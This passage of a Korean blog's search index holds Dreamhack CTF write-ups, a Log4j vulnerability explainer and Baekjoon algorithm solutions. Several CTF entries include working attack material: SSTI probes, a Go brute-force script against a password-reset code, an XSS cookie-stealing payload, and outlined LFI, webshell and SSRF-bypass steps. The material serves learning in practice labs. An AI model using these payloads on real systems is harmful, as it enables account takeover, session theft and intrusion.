필요한 이유는 경계 보안이 종종 실패한다는 점, 그리고 클라우드 도입으로 인해 네트워크 경계에 구멍이 많아졌다는 점에있습니다.\n","date":"2022-02-01T19:20:51+09:00","image":"https://appealso.github.io/p/microsegmentation/cover_huf9867630df38a1b7a1b101a60c990fcb_94636_120x120_fill_q75_box_smart1.jpg","permalink":"https://appealso.github.io/p/microsegmentation/","title":"Microsegmentation"},{"content":"[문제]  할로윈 파티를 기념하기 위해 호박을 준비했습니다! 호박을 10000번 클릭하고 플래그를 획득하세요!\n [해결법]  JavaScript click 이벤트를 10000번 호출 하면되는 문제였다. 간단히 while문으로 호출해서 풀 수 있었다.\n ","date":"2022-01-31T16:40:43+09:00","permalink":"https://appealso.github.io/p/dreamhack-carve-party/","title":"[dreamhack] Carve Party"},{"content":"[문제]  존재하지 않는 페이지 방문시 404 에러를 출력하는 서비스입니다. SSTI 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다. [해결법]  URL 뒤에 {{7*7}}을 넣으면 49가 나오는것으로 보아 SSTI 취약점이 있는것을 추측 할 수 있다.{URL}/{{config}}로 시도 시에 키 값을 간단한게 얻을 수 있었다. ","date":"2022-01-31T16:13:01+09:00","permalink":"https://appealso.github.io/p/dreamhack-simple-ssti/","title":"[dreamhack] simple-ssti"},{"content":"[문제]  python으로 작성된 로그인 기능을 가진 서비스입니다. “admin” 권한을 가진 사용자로 로그인하여 플래그를 획득하세요.\n [해결법]  제공하는 app.py만 잘 해석하면 풀 수 있는 문제였다. \u0026lsquo;/forgot_password\u0026rsquo;에 \u0026ldquo;time.sleep(1)\u0026rdquo; 구문이 있는데 1초안에 1~100까지 랜덤으로 생성되는 backupCode를 요청하면되었다. python으로 간단히 요청 코드를 작성하면 해결된다. 아래는 go 연습할겸 만든 코드 아래코드로 시도해도된당\n package main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;net/url\u0026#34; \u0026#34;runtime\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;time\u0026#34; ) func main() { runtime.GOMAXPROCS(runtime.NumCPU() - 2) for i := 1; i \u0026lt;= 100; i++ { go postRequst(i) } time.Sleep(time.Second * 3) } func postRequst(i int) { backupCode := strconv.Itoa(i) fmt.Println(backupCode + \u0026#34;번째시도\u0026#34;) resp, err := http.PostForm(\u0026#34;\u0026lt;문제URL\u0026gt;/forgot_password\u0026#34;, url.Values{\u0026#34;userid\u0026#34;: {\u0026#34;Apple\u0026#34;}, \u0026#34;newpassword\u0026#34;: {\u0026#34;Apple\u0026#34;}, \u0026#34;backupCode\u0026#34;: {backupCode}}) if err != nil { panic(err) } defer resp.Body.Close() } ","date":"2022-01-31T15:42:56+09:00","permalink":"https://appealso.github.io/p/dreamhack-login-1/","title":"[dreamhack] login-1"},{"content":"[문제]  여기본 설정을 사용한 서비스입니다. 로그인한 후 Organization에 플래그를 설정해 놓았습니다.  [해결법]  문제파일에 admin 정보가 있었다. 접속 후에 Organizaion 정보 찾으면 끝.. 5분안걸린듯.. ","date":"2022-01-31T14:54:40+09:00","permalink":"https://appealso.github.io/p/dreamhack-web-misconf-1/","title":"[dreamhack] web-misconf-1"},{"content":"최근 발표된 log4j 라이브러리에서 발견된 취약점을 정리하려고 합니다. 공격 방법에 비해 영향도가 너무 높아 크게 이슈가 된 취약점이 아닐까 생각이 듭니다.\n[개요]  java 에서 사용되는 log4j 라이브러리에서 취약점이 발표 되었고, 대부분의 라이브러리\n [주요내용]  Apache Log4j 2에서 발생하는 원격코드 실행 취약점(CVE-2021-44228) Apache Log4j 2에서 발생하는 원격코드 실행 취약점(CVE-2021-45046) Apache Log4j 1.x에서 발생하는 원격코드 실행 취약점(CVE-2021-4104)\n [영향받는버전]  CVE-2021-44228: 2.0-beta9 ~ 2.14.1 이하 (2.3.1, 2.12.2, 2.12.3 제외) CVE-2021-45046: 2.0-beta9 ~ 2.15.0 버전 (2.3.1, 2.12.2, 2.12.3 제외) CVE-2021-4104: 1.x 버전 ※ JMSAppender를 사용하지 않는 경우 취약점 영향 없음\n [취약점 설명]  log4j \n log4j 공격 방법은 심플 합니다. 공격자는 log4j를 사용하여 로그를 남기는 부분에 payload를 삽입하면 공격은 끝납니다. 공격이 성공하면 자신이 운영하고 있는 LDAP서버에서 공격 코드를 다운로드받아 공격을 시도한 서버에서 해당 코드를 실행시키는 원리입니다. 공격코드를 주입하는 방식에 따라 분류됩니다.\n CVE-2021-44228 : log4j로 로그를 남기는 부분에 직접 payload를 삽입하는 방식 CVE-2021-45046 : 변수 등에 payload를 삽입해 두고, 해당 변수를 호출하는 방식 CVE-2021-4104 : 환경변수파일(ex.log4j.properties)에 payload를 삽입해 놓고 로그를 남길때 공격하는 방식(로그를 남길때 payload가 실행됨)   [공격가능한시나리오] 공격시나리오는 아래 3가지를 생각해보았습니다.\n (1) 외부에서 Payload를 삽입을 시도하며 외부에 미리 구성해둔 LDAP서버로 부터 공격 코드를 받아 가게 하는 방식\n 공격자 입장에서는 가장 흔한 공격 방식일 것 같고, OutBound 정책만 잘 구성되어있다면 영향도가 없을 것으로 예상됐습니다.    (2) 내부에서 Payload를 삽입을 시도하며 외부에 미리 구성해둔 LDAP서버로 부터 공격 코드를 받아 가게 하는 방식\n 내부에서 공격 가능한 포인트를 찾아 외부에 구성해놓은 서버로 부터 공격코드를 받아 실행 하는 방식을 생각해 보았는데 이것 역시 OutBound 정책이 잘 구성되어있으면 영향도가 낮을 것으로 생각되었습니다.    (3) 내부에서 Payload를 삽입을 시도하며 내부에 미리 구성해둔 LDAP서버로 부터 공격 코드를 받아 가게 하는 방식\n 내부에서 공격서버를 구성하고, 내부에서 공격 코드를 실행하는 방식을 생각해 보았는데 내부 서버 팜의 경우 방화벽이 없기 떄문에 가장 영향도 높은 공격이 가능할 것으로 예상되었습니다. Spring Boot 같은 것을 사용하면 LDAP 서버를 구성하는 것이 쉽기 때문에 공격 자체도 어렵지 않은 것으로 예상이 되었습니다.   [공격 테스트방법]  LDAP 서버를 구성하면 시간이 들기때문에 페이로가 삽입될 만한 부분을 찾고 NC를 사용해서 리스너를 열고, 해당 리스너로 패킷이 들어오는지 여부를 체크하면 쉽게 공격 가능여부를 테스트 해볼 수 있습니다. 우회 공격을 시도할 경우 Github에서 payload 생성기 같은 것들을 찾아서 시도해볼 수 있습니다. 링크는 아래 참조. https://github.com/woodpecker-appstore/log4j-payload-generator\n [조치방안]  조치 방법은 안전한 버전으로 업데이트 하는것이겠지만, 1.x버전에서 안전한 버전으로 올리는 것은 영향도가 높기 때문에 적용하기까지 시간이 소요될 것입니다. 이를 위해서 할 수 있는 조치는 ips에서 룰생성을 통해 들어오는 공격을 방어하고 문제되는 JNDI LOOKUP기능을 비활성화 하는 방법이 있을 것입니다.\n [참조] https://aws.amazon.com/ko/blogs/korea/using-aws-security-services-to-protect-against-detect-and-respond-to-the-log4j-vulnerability/ https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389\n","date":"2021-12-26T00:00:00Z","image":"https://github.com/Appealso/Appealso.github.io/blob/master/images/log4j.jpg?raw=true","permalink":"https://appealso.github.io/p/log4j-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%95%EB%A6%AC/","title":"Log4j 취약점 정리"},{"content":"[문제]  여러 기능과 입력받은 URL을 확인하는 봇이 구현된 서비스입니다. XSS 취약점을 이용해 플래그를 획득하세요. 플래그는 flag.txt, FLAG 변수에 있습니다.\n [해결법]  \u0026lt;img src=\u0026lsquo;x\u0026rsquo; onerror=\u0026lsquo;location.href=\u0026quot;/memo?memo=\u0026quot;+document.cookie;'\u0026gt;\n ","date":"2021-10-05T22:28:53+09:00","permalink":"https://appealso.github.io/p/dreamhack-xss-2/","title":"[dreamhack] xss-2"},{"content":"[문제]  드림이가 톰캣 서버로 개발을 시작하였습니다. 서비스의 취약점을 찾아 플래그를 획득하세요. 플래그는 /flag 경로에 있습니다.\n [해결법]   LFI로 tomcat 비밀번호 획득 웹쉘 업로드 하여 플래그 탈취 ++ 설마\u0026hellip;웹쉘 올려야 하는지 고민하다가 너무 올래걸렸다\u0026hellip;ㅜㅜ ++ 톰캣 취약점을 알고 있긴 했는데 직접 공격해보니깐 느낌이 이상했다.   [참고] https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true\u0026blogId=sjhmc9695\u0026logNo=221996754470\n","date":"2021-10-05T21:46:26+09:00","permalink":"https://appealso.github.io/p/dreamhack-tomcat-manager/","title":"[dreamhack] Tomcat Manager"},{"content":"[문제]  드림이는 웹 크롤링 사이트를 구축했습니다. 크롤링 사이트에서 취약점을 찾고 flag를 획득하세요!\n [해결법] ssrf 우회 기법으로 ipaddress.ip_address(ip)).is_global 우회\n[참고] https://umbum.dev/473\n","date":"2021-10-05T21:40:18+09:00","permalink":"https://appealso.github.io/p/dreamhack-crawling/","title":"[dreamhack] crawling"},{"content":"[문제]  크기가 N인 수열 A = A1, A2, \u0026hellip;, AN이 있다. 수열의 각 원소 Ai에 대해서 오큰수 NGE(i)를 구하려고 한다. Ai의 오큰수는 오른쪽에 있으면서 Ai보다 큰 수 중에서 가장 왼쪽에 있는 수를 의미한다. 그러한 수가 없는 경우에 오큰수는 -1이다.\n예를 들어, A = [3, 5, 2, 7]인 경우 NGE(1) = 5, NGE(2) = 7, NGE(3) = 7, NGE(4) = -1이다. A \u0026gt; = [9, 5, 4, 8]인 경우에는 NGE(1) = -1, NGE(2) = 8, NGE(3) = 8, NGE(4) = -1이다.\n [입력]  첫째 줄에 수열 A의 크기 N (1 ≤ N ≤ 1,000,000)이 주어진다. 둘째 줄에 수열 A의 원소 A1, A2, \u0026hellip;, AN (1 ≤ Ai ≤ 1,000,000)이 주어진다.\n [출력]  N개의 수 NGE(1), NGE(2), \u0026hellip;, NGE(N)을 공백으로 구분해 출력한다.\n [소스] import java.io.BufferedReader; import java.io.InputStreamReader; import java.util.Stack; import java.util.StringTokenizer; public class Main { public static void main(String args[]) throws Exception{ BufferedReader br = new BufferedReader(new InputStreamReader(System.in)); Stack\u0026lt;Integer\u0026gt; st = new Stack\u0026lt;\u0026gt;(); int A = Integer.parseInt(br.readLine()); int[] seq = new int[A]; int[] ans = new int[A]; StringTokenizer stk = new StringTokenizer(br.readLine(),\u0026#34; \u0026#34;); for(int i=0;i\u0026lt;A;i++) seq[i]=Integer.parseInt(stk.nextToken()); for(int i=A-1;i\u0026gt;=0;i--){ while(!st.isEmpty()\u0026amp;\u0026amp;st.peek()\u0026lt;=seq[i]) st.pop(); if(st.isEmpty())ans[i]=-1; else ans[i]=st.peek(); st.push(seq[i]); } StringBuilder sb = new StringBuilder(); for(int tmp : ans) sb.append(tmp+\u0026#34; \u0026#34;); System.out.println(sb); } } 문제링크 https://www.acmicpc.net/problem/17298\n","date":"2021-08-29T14:26:07+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-17298-%EC%98%A4%ED%81%B0%EC%88%98/","title":"백준 17298 오큰수"},{"content":"[문제]  세계는 균형이 잘 잡혀있어야 한다. 양과 음, 빛과 어둠 그리고 왼쪽 괄호와 오른쪽 괄호처럼 말이다. 정민이의 임무는 어떤 문자열이 주어졌을 때, 괄호들의 균형이 잘 맞춰져 있는지 판단하는 프로그램을 짜는 것이다. 문자열에 포함되는 괄호는 소괄호(\u0026quot;()\u0026quot;) 와 대괄호(\u0026quot;[]\u0026quot;)로 2종류이고, 문자열이 균형을 이루는 조건은 아래와 같다.\n 모든 왼쪽 소괄호(\u0026quot;(\u0026quot;)는 오른쪽 소괄호(\u0026quot;)\u0026quot;)와만 짝을 이뤄야 한다. 모든 왼쪽 대괄호(\u0026quot;[\u0026quot;)는 오른쪽 대괄호(\u0026quot;]\u0026quot;)와만 짝을 이뤄야 한다. 모든 오른쪽 괄호들은 자신과 짝을 이룰 수 있는 왼쪽 괄호가 존재한다. 모든 괄호들의 짝은 1:1 매칭만 가능하다. 즉, 괄호 하나가 둘 이상의 괄호와 짝지어지지 않는다. 짝을 이루는 두 괄호가 있을 때, 그 사이에 있는 문자열도 균형이 잡혀야 한다. 정민이를 도와 문자열이 주어졌을 때 균형잡힌 문자열인지 아닌지를 판단해보자.   [입력]  하나 또는 여러줄에 걸쳐서 문자열이 주어진다. 각 문자열은 영문 알파벳, 공백, 소괄호(\u0026quot;( )\u0026quot;) 대괄호(\u0026quot;[ ]\u0026quot;)등으로 이루어져 있으며, 길이는 100글자보다 작거나 같다. 입력의 종료조건으로 맨 마지막에 점 하나(\u0026quot;.\u0026quot;)가 들어온다.\n [출력]  각 줄마다 해당 문자열이 균형을 이루고 있으면 \u0026ldquo;yes\u0026quot;를, 아니면 \u0026ldquo;no\u0026quot;를 출력한다.\n [소스] import java.util.Scanner; import java.util.Stack; public class Main { public static void main(String[] args) throws Exception{ Scanner sc = new Scanner(System.in); Stack\u0026lt;Character\u0026gt; st; while(true){ String tmp = sc.nextLine(); if(tmp.equals(\u0026#34;.\u0026#34;)) break; st=new Stack\u0026lt;Character\u0026gt;(); for(int i=0;i\u0026lt;tmp.length();i++){ char c = tmp.charAt(i); if(c==\u0026#39;(\u0026#39;||c==\u0026#39;[\u0026#39;) st.push(c); if(c==\u0026#39;)\u0026#39;||c==\u0026#39;]\u0026#39;){ if(st.isEmpty() || (st.peek() == \u0026#39;(\u0026#39; \u0026amp;\u0026amp; c == \u0026#39;]\u0026#39;) || (st.peek() == \u0026#39;[\u0026#39; \u0026amp;\u0026amp; c == \u0026#39;)\u0026#39;)){ st.push(c); break; } else st.pop(); } } if(st.isEmpty()) System.out.println(\u0026#34;yes\u0026#34;); else System.out.println(\u0026#34;no\u0026#34;); } } } 문제링크 https://www.acmicpc.net/problem/4949\n","date":"2021-08-22T15:38:35+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-4949-%EA%B7%A0%ED%98%95%EC%9E%A1%ED%9E%8C-%EC%84%B8%EC%83%81/","title":"백준 4949 균형잡힌 세상"},{"content":"[문제]  스도쿠는 18세기 스위스 수학자가 만든 \u0026lsquo;라틴 사각형\u0026rsquo;이랑 퍼즐에서 유래한 것으로 현재 많은 인기를 누리고 있다. 이 게임은 아래 그림과 같이 가로, 세로 각각 9개씩 총 81개의 작은 칸으로 이루어진 정사각형 판 위에서 이뤄지는데, 게임 시작 전 일부 칸에는 1부터 9까지의 숫자 중 하나가 쓰여 있다.\n 스도쿠 \n나머지 빈 칸을 채우는 방식은 다음과 같다.\n 각각의 가로줄과 세로줄에는 1부터 9까지의 숫자가 한 번씩만 나타나야 한다. 굵은 선으로 구분되어 있는 3x3 정사각형 안에도 1부터 9까지의 숫자가 한 번씩만 나타나야 한다.  위의 예의 경우, 첫째 줄에는 1을 제외한 나머지 2부터 9까지의 숫자들이 이미 나타나 있으므로 첫째 줄 빈칸에는 \u0026gt; 1이 들어가야 한다.\n 스도쿠 \n또한 위쪽 가운데 위치한 3x3 정사각형의 경우에는 3을 제외한 나머지 숫자들이 이미 쓰여있으므로 가운데 빈 칸에는 \u0026gt; 3이 들어가야 한다.  스도쿠 \n이와 같이 빈 칸을 차례로 채워 가면 다음과 같은 최종 결과를 얻을 수 있다.  스도쿠 \n게임 시작 전 스도쿠 판에 쓰여 있는 숫자들의 정보가 주어질 때 모든 빈 칸이 채워진 최종 모습을 출력하는 프로그램을 작성하시오.\n [입력]  아홉 줄에 걸쳐 한 줄에 9개씩 게임 시작 전 스도쿠판 각 줄에 쓰여 있는 숫자가 한 칸씩 띄워서 차례로 주어진다. 스도쿠 판의 빈 칸의 경우에는 0이 주어진다. 스도쿠 판을 규칙대로 채울 수 없는 경우의 입력은 주어지지 않는다.\n [출력]  모든 빈 칸이 채워진 스도쿠 판의 최종 모습을 아홉 줄에 걸쳐 한 줄에 9개씩 한 칸씩 띄워서 출력한다. 스도쿠 판을 채우는 방법이 여럿인 경우는 그 중 하나만을 출력한다.\n [소스] import java.io.BufferedReader; import java.io.InputStreamReader; import java.util.ArrayList; import java.util.StringTokenizer; public class Main { static int[][] sudoku = new int[9][9]; static ArrayList\u0026lt;int[]\u0026gt; list= new ArrayList\u0026lt;\u0026gt;(); static boolean check=false; public static void main(String[] args) throws Exception{ BufferedReader br = new BufferedReader(new InputStreamReader(System.in)); for(int i=0;i\u0026lt;9;i++) { StringTokenizer stk = new StringTokenizer(br.readLine(), \u0026#34; \u0026#34;); for (int j = 0; j \u0026lt; 9; j++) { sudoku[i][j] = Integer.parseInt(stk.nextToken()); if (sudoku[i][j] == 0) { list.add(new int[]{i, j}); } } } go(0,0); } static void go(int idx,int depth){ if(depth==list.size()){ StringBuilder sb=new StringBuilder(); for(int i = 0; i \u0026lt; 9; i++) { for (int j = 0; j \u0026lt; 9; j++) { sb.append(sudoku[i][j] + \u0026#34; \u0026#34;); } sb.append(\u0026#39;\\n\u0026#39;); } System.out.println(sb); check=true; return; } if(check) return; if(idx\u0026gt;=list.size()) return; int i=list.get(idx)[0]; int j=list.get(idx)[1]; for(int k=1;k\u0026lt;=9;k++){ if(check(i,j,k)){ sudoku[i][j]=k; go(idx+1,depth+1); sudoku[i][j]=0; } } } static boolean check(int i,int j,int n){ for(int k=0;k\u0026lt;9;k++) { if (sudoku[i][k]==n) return false; if (sudoku[k][j]==n) return false; } int ni=i/3*3; int nj=j/3*3; for(int k=ni;k\u0026lt;ni+3;k++){ for(int l=nj;l\u0026lt;nj+3;l++) if(sudoku[k][l]==n) return false; } return true; } } 문제링크 https://www.acmicpc.net/problem/2580\n","date":"2021-08-21T11:27:56+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-2580-%EC%8A%A4%EB%8F%84%EC%BF%A0/","title":"백준 2580 스도쿠"},{"content":"[문제]  세 개의 장대가 있고 첫 번째 장대에는 반경이 서로 다른 n개의 원판이 쌓여 있다. 각 원판은 반경이 큰 순서대로 쌓여있다. 이제 수도승들이 다음 규칙에 따라 첫 번째 장대에서 세 번째 장대로 옮기려 한다.s\n 한 번에 한 개의 원판만을 다른 탑으로 옮길 수 있다. 쌓아 놓은 원판은 항상 위의 것이 아래의 것보다 작아야 한다.  이 작업을 수행하는데 필요한 이동 순서를 출력하는 프로그램을 작성하라. 단, 이동 횟수는 최소가 되어야 한다.\n아래 그림은 원판이 5개인 경우의 예시이다.\n 하노이탑! \n [입력]  첫째 줄에 첫 번째 장대에 쌓인 원판의 개수 N (1 ≤ N ≤ 20)이 주어진다.\n [출력]  첫째 줄에 옮긴 횟수 K를 출력한다. 두 번째 줄부터 수행 과정을 출력한다. 두 번째 줄부터 K개의 줄에 걸쳐 두 정수 A B를 빈칸을 사이에 두고 출력하는데, 이는 A번째 탑의 가장 위에 있는 원판을 B번째 탑의 가장 위로 옮긴다는 뜻이다.\n [소스] import java.io.BufferedReader; import java.io.InputStreamReader; import java.util.StringTokenizer; public class Main { static int ans=0; static StringBuilder sb=new StringBuilder(); public static void main(String[] args) throws Exception{ BufferedReader br=new BufferedReader(new InputStreamReader(System.in)); StringTokenizer stk=new StringTokenizer(br.readLine()); int N=Integer.parseInt(stk.nextToken()); go(1,2,3, N); System.out.println(ans); System.out.print(sb); } static void go(int from,int sub, int to, int N){ ans++; if(N==1){ sb.append(from+\u0026#34; \u0026#34;+to+\u0026#34;\\n\u0026#34;); return; } go(from,to,sub,N-1); sb.append(from+\u0026#34; \u0026#34;+to+\u0026#34;\\n\u0026#34;); go(sub,from,to,N-1); } } 문제링크 https://www.acmicpc.net/problem/11729\n","date":"2021-08-16T11:57:47+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-11729-%ED%95%98%EB%85%B8%EC%9D%B4-%ED%83%91-%EC%9D%B4%EB%8F%99-%EC%88%9C%EC%84%9C/","title":"백준 11729 하노이 탑 이동 순서"},{"content":"[문제]  재귀적인 패턴으로 별을 찍어 보자. N이 3의 거듭제곱(3, 9, 27, \u0026hellip;)이라고 할 때, 크기 N의 패턴은 N×N 정사각형 모양이다. 크기 3의 패턴은 가운데에 공백이 있고, 가운데를 제외한 모든 칸에 별이 하나씩 있는 패턴이다.\n***\n* *\n***\nN이 3보다 클 경우, 크기 N의 패턴은 공백으로 채워진 가운데의 (N/3)×(N/3) 정사각형을 크기 N/3의 패턴으로 둘러싼 형태이다. 예를 들어 크기 27의 패턴은 예제 출력 1과 같다.\n [입력]  첫째 줄에 N이 주어진다. N은 3의 거듭제곱이다. 즉 어떤 정수 k에 대해 N=3k이며, 이때 1 ≤ k \u0026lt; 8이다.\n [출력]  첫째 줄부터 N번째 줄까지 별을 출력한다\n [소스] import java.io.BufferedReader; import java.io.InputStreamReader; import java.util.StringTokenizer; public class Main { static StringBuilder sb = new StringBuilder(); public static void main(String[] args) throws Exception{ BufferedReader br=new BufferedReader(new InputStreamReader(System.in)); StringTokenizer stk=new StringTokenizer(br.readLine()); int N=Integer.parseInt(stk.nextToken()); for(int i=0;i\u0026lt;N;i++) { for (int j = 0; j \u0026lt; N; j++) go(i, j, N); sb.append(\u0026#39;\\n\u0026#39;); } System.out.println(sb); } static void go(int i,int j,int N){ if((i/N%3==1\u0026amp;\u0026amp;(j/N)%3==1)){ sb.append(\u0026#39; \u0026#39;); }else if(N/3==0) sb.append(\u0026#39;*\u0026#39;); else go(i,j,N/3); } } 문제링크 https://www.acmicpc.net/problem/2447\n","date":"2021-08-16T09:22:57+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-2447-%EB%B3%84%EC%B0%8D%EA%B8%B0-10/","title":"백준 2447 별찍기-10"},{"content":"[문제]  나코더 기장 재민이는 동아리 회식을 준비하기 위해서 장부를 관리하는 중이다. 재현이는 재민이를 도와서 돈을 관리하는 중인데, 애석하게도 항상 정신없는 재현이는 돈을 실수로 잘못 부르는 사고를 치기 일쑤였다. 재현이는 잘못된 수를 부를 때마다 0을 외쳐서, 가장 최근에 재민이가 쓴 수를 지우게 시킨다. 재민이는 이렇게 모든 수를 받아 적은 후 그 수의 합을 알고 싶어 한다. 재민이를 도와주자!\n [입력]  첫 번째 줄에 정수 K가 주어진다. (1 ≤ K ≤ 100,000) 이후 K개의 줄에 정수가 1개씩 주어진다. 정수는 0에서 1,000,000 사이의 값을 가지며, 정수가 \u0026ldquo;0\u0026rdquo; 일 경우에는 가장 최근에 쓴 수를 지우고, 아닐 경우 해당 수를 쓴다. 정수가 \u0026ldquo;0\u0026quot;일 경우에 지울 수 있는 수가 있음을 보장할 수 있다.\n [출력]  재민이가 최종적으로 적어 낸 수의 합을 출력한다. 최종적으로 적어낸 수의 합은 2^31-1보다 작거나 같은 정수이다.\n [소스] import java.util.Scanner; import java.util.Stack; public class Main { public static void main(String[] args){ Scanner sc = new Scanner(System.in); int K=sc.nextInt(); Stack\u0026lt;Integer\u0026gt; st = new Stack\u0026lt;Integer\u0026gt;(); for(int i=0;i\u0026lt;K;i++){ int tmp=sc.nextInt(); if(tmp!=0) st.push(tmp); else st.pop(); } int ans=0; while(!st.isEmpty()) ans+=st.pop(); System.out.println(ans); } } 문제링크 https://www.acmicpc.net/problem/10773\n","date":"2021-08-13T21:28:50+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-10733-%EC%A0%9C%EB%A1%9C/","title":"백준 10733 제로"},{"content":"[문제]  9개의 서로 다른 자연수가 주어질 때, 이들 중 최댓값을 찾고 그 최댓값이 몇 번째 수인지를 구하는 프로그램을 \u0026gt; 작성하시오. 예를 들어, 서로 다른 9개의 자연수 3, 29, 38, 12, 57, 74, 40, 85, 61 이 주어지면, 이들 중 최댓값은 85이고, 이 값은 8번째 수이다.\n [입력]  첫째 줄부터 아홉 번째 줄까지 한 줄에 하나의 자연수가 주어진다. 주어지는 자연수는 100 보다 작다.\n [출력]  첫째 줄에 최댓값을 출력하고, 둘째 줄에 최댓값이 몇 번째 수인지를 출력한다.\n [소스] import java.util.*; public class Main { public static void main(String[] args){ Scanner sc = new Scanner(System.in); int ans = 0; int cnt = 0; for(int i=0;i\u0026lt;9;i++){ int tmp=sc.nextInt(); if(ans\u0026lt;tmp) { ans = tmp; cnt = i; } } System.out.println(ans); System.out.println(cnt+1); } } 문제링크 https://www.acmicpc.net/problem/2562\n","date":"2021-08-11T20:43:49+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-2562-%EC%B5%9C%EB%8C%93%EA%B0%92/","title":"백준 2562 최댓값"},{"content":"[문제]  자연수 A와 B가 있을 때, A%B는 A를 B로 나눈 나머지 이다. 예를 들어, 7, 14, 27, 38을 3으로 나눈 \u0026gt;머지는 1, 2, 0, 2이다. 10개를 입력받은 뒤, 이를 42로 나눈 나머지를 구한다. 그 다음 서로 다른 값이 몇 개 있는지 출력하는 \u0026gt;로그램을 작성하시오.\n [입력]  첫째 줄부터 열번째 줄 까지 숫자가 한 줄에 하나씩 주어진다. 이 숫자는 1,000보다 작거나 같고, 음이 아닌 정수이다.\n [출력]  첫째 줄에, 42로 나누었을 때, 서로 다른 나머지가 몇 개 있는지 출력한다.\n [소스] import java.util.*; public class Main { public static void main(String[] args){ int[] arr = new int[42]; int ans=0; Scanner sc = new Scanner(System.in); for(int i=0;i\u0026lt;10;i++) arr[(sc.nextInt()%42)]++; for(int i=0;i\u0026lt;42;i++) if(arr[i]\u0026gt;0) ans++; System.out.println(ans); } } 문제링크 https://www.acmicpc.net/problem/3052\n","date":"2021-08-11T20:43:43+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-3052-%EB%82%98%EB%A8%B8%EC%A7%80/","title":"백준 3052 나머지"},{"content":"[문제]  자연수 N과 M이 주어졌을 때, 아래 조건을 만족하는 길이가 M인 수열을 모두 구하는 프로그램을 작성하시오. 1부터 N까지 자연수 중에서 M개를 고른 수열 같은 수를 여러 번 골라도 된다. 고른 수열은 비내림차순이어야 한다. 길이가 K인 수열 A가 A1 ≤ A2 ≤ \u0026hellip; ≤ AK-1 ≤ AK를 만족하면, 비내림차순이라고 한다.\n [입력]  첫째 줄에 자연수 N과 M이 주어진다. (1 ≤ M ≤ N ≤ 8)\n [출력]  한 줄에 하나씩 문제의 조건을 만족하는 수열을 출력한다. 중복되는 수열을 여러 번 출력하면 안되며, 각 수열은 \u0026gt; 공백으로 구분해서 출력해야 한다. 수열은 사전 순으로 증가하는 순서로 출력해야 한다.\n [소스] import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.util.StringTokenizer; public class Main { static int N,M; static int[] ans; static StringBuilder sb = new StringBuilder(); public static void main(String[] args) throws IOException{ BufferedReader br = new BufferedReader(new InputStreamReader(System.in)); StringTokenizer stk = new StringTokenizer(br.readLine(),\u0026#34; \u0026#34;); N=Integer.parseInt(stk.nextToken()); M=Integer.parseInt(stk.nextToken()); ans=new int[M]; go(1,0); System.out.println(sb); } static void go(int st,int depth) { if(depth==M) { for(int tmp:ans) sb.append(tmp+\u0026#34; \u0026#34;); sb.append(\u0026#39;\\n\u0026#39;); return; } for(int i=st;i\u0026lt;=N;i++) { ans[depth]=i; go(i,depth+1); } } } 문제링크 https://www.acmicpc.net/problem/15652\n","date":"2021-08-09T12:27:10+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-15651-n%EA%B3%BC-m-4/","title":"백준 15651 N과 M (4)"},{"content":"[문제]  카지노에서 제일 인기 있는 게임 블랙잭의 규칙은 상당히 쉽다. 카드의 합이 21을 넘지 않는 한도 내에서, 카드의 합을 최대한 크게 만드는 게임이다. 블랙잭은 카지노마다 다양한 규정이 있다. 한국 최고의 블랙잭 고수 김정인은 새로운 블랙잭 규칙을 만들어 상근, 창영이와 게임하려고 한다. 김정인 버전의 블랙잭에서 각 카드에는 양의 정수가 쓰여 있다. 그 다음, 딜러는 N장의 카드를 모두 숫자가 보이도록 바닥에 놓는다. 그런 후에 딜러는 숫자 M을 크게 외친다. 이제 플레이어는 제한된 시간 안에 N장의 카드 중에서 3장의 카드를 골라야 한다. 블랙잭 변형 게임이기 때문에, 플레이어가 고른 카드의 합은 M을 넘지 않으면서 M과 최대한 가깝게 만들어야 한다. N장의 카드에 써져 있는 숫자가 주어졌을 때, M을 넘지 않으면서 M에 최대한 가까운 카드 3장의 합을 구해 \u0026gt; 출력하시오.\n ##[입력]\n 첫째 줄에 카드의 개수 N(3 ≤ N ≤ 100)과 M(10 ≤ M ≤ 300,000)이 주어진다. 둘째 줄에는 카드에 쓰여 있는 수가 주어지며, 이 값은 100,000을 넘지 않는 양의 정수이다. 합이 M을 넘지 않는 카드 3장을 찾을 수 있는 경우만 입력으로 주어진다.\n [출력]  첫째 줄에 M을 넘지 않으면서 M에 최대한 가까운 카드 3장의 합을 출력한다.\n [소스] import java.util.Scanner; public class Main { public static void main(String[] args){ Scanner sc = new Scanner(System.in); int N=sc.nextInt(); int M=sc.nextInt(); int max=0; int[] arr=new int[N]; for(int i=0;i\u0026lt;N;i++) arr[i]=sc.nextInt(); for(int i=0;i\u0026lt;N-2;i++) for(int j=i+1;j\u0026lt;N-1;j++) for(int k=j+1;k\u0026lt;N;k++){ int tmp=0; tmp=arr[i]+arr[j]+arr[k]; if(max\u0026lt;tmp\u0026amp;\u0026amp;tmp\u0026lt;=M) max=tmp; } System.out.println(max); } } 문제링크 https://www.acmicpc.net/problem/2798\n","date":"2021-08-09T12:25:01+09:00","permalink":"https://appealso.github.io/p/%EB%B0%B1%EC%A4%80-2798-%EB%B8%94%EB%9E%99%EC%9E%AD/","title":"백준 2798 블랙잭"},{"content":"[문제]  자연수 N과 M이 주어졌을 때, 아래 조건을 만족하는 길이가 M인 수열을 모두 구하는 프로그램을 작성하시오. 1부터 N까지 자연수 중에서 M개를 고른 수열 같은 수를 여러 번 골라도 된다..\n [입력]  첫째 줄에 